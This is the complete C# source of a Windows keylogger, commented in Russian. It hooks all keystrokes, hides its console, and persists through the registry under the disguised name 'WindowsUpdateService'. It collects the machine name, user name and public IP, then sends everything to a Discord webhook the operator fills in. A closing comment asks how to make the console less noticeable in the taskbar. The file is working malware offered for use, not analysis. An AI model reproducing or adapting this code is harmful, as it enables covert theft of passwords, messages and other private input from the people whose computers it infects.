using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string discordWebhookUrl = // Сюда Вставляем Discord WebHook :)
            "-> Discord WebHook <- ";

        private static List<string> logBuffer = new List<string>();
        private static HttpClient httpClient = new HttpClient();
        private static bool firstMessageSent = false;

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode,
            byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
            int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static Dictionary<int, string> specialKeys = new Dictionary<int, string>
        {
            { 8, "[BACKSPACE]" }, { 9, "[TAB]" }, { 13, "[ENTER]\n" }, { 16, "[SHIFT]" }, { 17, "[CTRL]" },
            { 18, "[ALT]" }, { 20, "[CAPSLOCK]" }, { 27, "[ESC]" }, { 32, " " }, { 33, "[PAGE UP]" },
            { 34, "[PAGE DOWN]" }, { 35, "[END]" }, { 36, "[HOME]" }, { 37, "[LEFT]" }, { 38, "[UP]" },
            { 39, "[RIGHT]" }, { 40, "[DOWN]" }, { 45, "[INSERT]" }, { 46, "[DELETE]" }, { 91, "[WIN]" },
            { 92, "[WIN]" }, { 144, "[NUMLOCK]" }, { 160, "[SHIFT]" }, { 161, "[SHIFT]" }, { 162, "[CTRL]" },
            { 163, "[CTRL]" }, { 164, "[ALT]" }, { 165, "[ALT]" }, { 186, ";" }, { 187, "=" }, { 188, "," },
            { 189, "-" }, { 190, "." }, { 191, "/" }, { 192, "`" }, { 219, "[" }, { 220, "\\" }, { 221, "]" },
            { 222, "'" }
        };

        private static void AddToRegistryStartup()
        {
            try
            {
                string appName = "WindowsUpdateService";
                string appPath = Process.GetCurrentProcess().MainModule.FileName;

                RegistryKey key = Registry.CurrentUser.OpenSubKey(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue(appName, appPath);
                key.Close();

                Console.WriteLine("[+] Добавлено в Автозагрузку Через Реестр!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Ошибка Реестра: {ex.Message}");
            }
        }

        static async void SendStartupMessage()
        {
            string ipAddress = GetPublicIP();
            string startupMessage = $"```\n[*** KeyLogger запущен {DateTime.Now:dd.MM.yyyy HH:mm:ss} ***]\n" +
                                   $"[Система: {Environment.OSVersion.Platform} {Environment.OSVersion.Version}]\n" +
                                   $"[ПК: {Environment.MachineName}] - " +
                                   $"[Пользователь: {Environment.UserName}]\n" +
                                   $"[IP Адрес: {ipAddress}]\n```";

            try
            {
                var content = new StringContent(
                    $"{{\"content\":\"{EscapeJson(startupMessage)}\",\"username\":\"KeyLogger - {Environment.MachineName}\"}}",
                    Encoding.UTF8, "application/json");

                await httpClient.PostAsync(discordWebhookUrl, content);
                firstMessageSent = true;
            }
            catch { }
        }

        static string GetPublicIP()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    string publicIP = client.GetStringAsync("https://api.ipify.org").Result;
                    return publicIP;
                }
            }
            catch
            {
                return "[-] Не Удалось Получить Внешний IP..";
            }
        }


        static void RunKeyLogger()
        {
            HideConsole();

            _hookID = SetHook(_proc);
            if (_hookID == IntPtr.Zero) return;

            System.Windows.Forms.Application.Run();

            SendBufferedLogsToDiscord(true);
            UnhookWindowsHookEx(_hookID);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        private static void HideConsole()
        {
            var consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero) ShowWindow(consoleWindow, SW_HIDE);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = GetKeyString(vkCode);

                if (!string.IsNullOrEmpty(key))
                {
                    logBuffer.Add($"[{DateTime.Now:HH:mm:ss}] {key}");

                    if (logBuffer.Count >= 10)
                    {
                        Task.Run(() => SendBufferedLogsToDiscord(false));
                    }
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetKeyString(int vkCode)
        {
            if (specialKeys.ContainsKey(vkCode)) return specialKeys[vkCode];

            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);

            IntPtr foregroundWindow = GetForegroundWindow();
            uint foregroundProcess = GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero);
            IntPtr keyboardLayout = GetKeyboardLayout(foregroundProcess);

            StringBuilder result = new StringBuilder(10);
            int conversionResult = ToUnicodeEx((uint)vkCode, 0, keyboardState, result, 10, 0, keyboardLayout);

            if (conversionResult > 0) return result.ToString();
            else if (vkCode >= 65 && vkCode <= 90)
            {
                bool shiftPressed = (keyboardState[16] & 0x80) != 0;
                bool capsLock = (keyboardState[20] & 0x01) != 0;
                char letter = (char)('A' + (vkCode - 65));
                return (shiftPressed ^ capsLock) ? letter.ToString() : letter.ToString().ToLower();
            }
            else if (vkCode >= 48 && vkCode <= 57) return ((char)vkCode).ToString();

            return $"[VK:{vkCode}]";
        }

        private static async void SendBufferedLogsToDiscord(bool finalSend)
        {
            if (logBuffer.Count == 0 && !finalSend) return;

            List<string> logsToSend;
            lock (logBuffer)
            {
                logsToSend = new List<string>(logBuffer);
                if (!finalSend) logBuffer.Clear();
            }

            if (logsToSend.Count == 0) return;

            try
            {
                string message = "```\n" + string.Join("\n", logsToSend) + "\n```";
                if (message.Length > 2000) message = message.Substring(0, 1997) + "...";

                var content = new StringContent(
                    $"{{\"content\":\"{EscapeJson(message)}\",\"username\":\"KeyLogger - {Environment.MachineName}\"}}",
                    Encoding.UTF8, "application/json");

                await httpClient.PostAsync(discordWebhookUrl, content);
            }
            catch
            {
                if (!finalSend)
                {
                    lock (logBuffer) logBuffer.InsertRange(0, logsToSend);
                }
            }
        }

        private static string EscapeJson(string input)
        {
            return input.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
        }

        static void Main()
        {
            Console.Title = "KeyLogger - Project";

            AddToRegistryStartup();

            Console.WriteLine("[+] KeyLogger Успешно Запущен!");
            Thread.Sleep(1000);
            Console.Write("[*] Начинайте Печатать.. ");

            Thread.Sleep(2000);
            Console.Clear();

            Console.WriteLine(@"
             █████   ████                     █████                                                    
            ░░███   ███░                     ░░███                                                     
             ░███  ███     ██████  █████ ████ ░███         ██████   ███████  ███████  ██████  ████████ 
             ░███████     ███░░███░░███ ░███  ░███        ███░░███ ███░░███ ███░░███ ███░░███░░███░░███
             ░███░░███   ░███████  ░███ ░███  ░███       ░███ ░███░███ ░███░███ ░███░███████  ░███ ░░░ 
             ░███ ░░███  ░███░░░   ░███ ░███  ░███      █░███ ░███░███ ░███░███ ░███░███░░░   ░███     
             █████ ░░████░░██████  ░░███████  ███████████░░██████ ░░███████░░███████░░██████  █████    
            ░░░░░   ░░░░  ░░░░░░    ░░░░░███ ░░░░░░░░░░░  ░░░░░░   ░░░░░███ ░░░░░███ ░░░░░░  ░░░░░     
                                    ███ ░███                       ███ ░███ ███ ░███                   
                                   ░░██████                       ░░██████ ░░██████                    
                                    ░░░░░░                         ░░░░░░   ░░░░░░                     
            ");

            HideConsole();

            SendStartupMessage();
            RunKeyLogger();
        }
    }
}


//  -- Удаление keylogger'а из Автозагрузки --
// Win + R → regedit.
// Перейти По Пути - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
// Найти запись keylogger'а и удалить. - как убрать консоль из панели задач а то ее там видно и палевно
